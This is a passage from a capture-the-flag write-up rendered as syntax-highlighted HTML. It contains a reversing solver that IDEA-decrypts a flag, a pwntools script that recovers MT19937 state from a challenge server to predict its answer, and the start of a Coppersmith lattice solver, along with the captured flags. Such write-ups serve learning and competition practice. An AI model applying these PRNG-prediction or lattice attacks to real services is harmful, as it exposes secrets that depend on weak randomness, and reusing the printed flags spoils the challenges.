class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x4872D39F</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xF2A2E59B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x011B94D2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 爆破前7字节</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">28</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">&lt;</span> <span class=\"token number\">132</span><span class=\"token punctuation\">;</span> c<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">)</span>c <span class=\"token operator\">^</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xB0E0E879</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> enc1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 后16字节进行IDEA解密</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc2<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// unsigned int key[4] = &#123;</span>\n    <span class=\"token comment\">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x6C98B242</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78563412</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6A6D0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFCDAB89</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    code keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n        keys_input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> cipher1<span class=\"token punctuation\">,</span> cipher2<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token generic-function\"><span class=\"token function\">i</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            cipher1<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>enc2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            cipher2<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>enc2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token operator\">-</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">subkeys_get</span><span class=\"token punctuation\">(</span>keys_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">inv_subkeys_get</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plain1 <span class=\"token operator\">=</span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>cipher1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plain2 <span class=\"token operator\">=</span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>cipher2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint64_t</span> plain1_val <span class=\"token operator\">=</span> plain1<span class=\"token punctuation\">.</span><span class=\"token function\">to_ullong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> plain2_val <span class=\"token operator\">=</span> plain2<span class=\"token punctuation\">.</span><span class=\"token function\">to_ullong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint8_t</span> dec2<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dec2<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>plain2_val<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dec2 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>plain1_val<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>dec2<span class=\"token punctuation\">,</span> dec2 <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.16s\\n\"</span><span class=\"token punctuation\">,</span> dec2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{moshui_build_this_block}</p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"Division\"><a href=\"#Division\" class=\"headerlink\" title=\"Division\"></a>Division</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    choose <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">': >>> '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> choose <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            denominator <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'input the denominator: >>> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'INPUT NUMBERS'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n        nominator <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> denominator <span class=\"token operator\">==</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NO YOU DONT'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>nominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">//</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>denominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>nominator<span class=\"token operator\">//</span>denominator<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n</code></pre>\n\n<p>题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> randcrack <span class=\"token keyword\">import</span> RandCrack\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.217.82\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28739</span> <span class=\"token punctuation\">)</span>\ndata<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>> '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'tor: >>> '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    line<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nRC <span class=\"token operator\">=</span> RandCrack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n    RC<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'er: >>>'</span><span class=\"token punctuation\">)</span>\nrand1 <span class=\"token operator\">=</span> RC<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">11000</span><span class=\"token punctuation\">)</span>\nrand2 <span class=\"token operator\">=</span> RC<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span>\ncorrect_ans <span class=\"token operator\">=</span> rand1 <span class=\"token operator\">//</span> rand2\n\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>correct_ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </code></pre>\n\n<blockquote>\n<p>XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}</p>\n</blockquote>\n<h3 id=\"Complex-signin\"><a href=\"#Complex-signin\" class=\"headerlink\" title=\"Complex_signin\"></a>Complex_signin</h3><p>题目构造了复数对象，混淆了m的实部和虚部的低128位,已知</p>\n<p><img src=\"/images/cry1-1744626745339-67.png\" alt=\"cry1\"></p>\n<p>二元copper解低位即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> ChaCha20\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> itertools\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">small_roots</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">,</span> m<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> d<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> d<span class=\"token punctuation\">:</span>\n        d <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>degree<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    R <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>base_ring<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    N <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>cardinality<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    f <span class=\"token operator\">/=</span> f<span class=\"token punctuation\">.</span>coefficients<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    f <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span>\n\n    G <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        base <span class=\"token operator\">=</span> N <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">-</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> f <span class=\"token operator\">^</span> i\n        <span class=\"token keyword\">for</span> shifts <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>nvariables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            g <span class=\"token operator\">=</span> base <span class=\"token operator\">*</span> prod<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>power<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> shifts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span>\n\n    B<span class=\"token punctuation\">,</span> monomials <span class=\"token operator\">=</span> G<span class=\"token punctuation\">.</span>coefficient_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    monomials <span class=\"token operator\">=</span> vector<span class=\"token punctuation\">(</span>monomials<span class=\"token punctuation\">)</span>\n\n    factors <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>monomial<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>bounds<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> monomial <span class=\"token keyword\">in</span> monomials<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        B<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> factor<span class=\"token punctuation\">)</span>\n\n    B <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>dense_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    B <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        B<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token operator\">/</span> factor<span class=\"token punctuation\">)</span>\n\n    H <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> B <span class=\"token operator\">*</span> monomials<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        H<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span>\n        I <span class=\"token operator\">=</span> H<span class=\"token punctuation\">.</span>ideal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            H<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">for</span> root <span class=\"token keyword\">in</span> I<span class=\"token punctuation\">.</span>variety<span class=\"token punctuation\">(</span>ring<span class=\"token operator\">=</span>ZZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                root <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">[</span>var<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> var <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> roots\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Complex</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">,</span> im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> re\n        self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> im\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mul__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        re_ <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">-</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>im\n        im_ <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>re\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>re_<span class=\"token punctuation\">,</span> im_<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__eq__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>re <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>im\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__rshift__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">>></span> m<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">>></span> m<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__lshift__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> m<span class=\"token 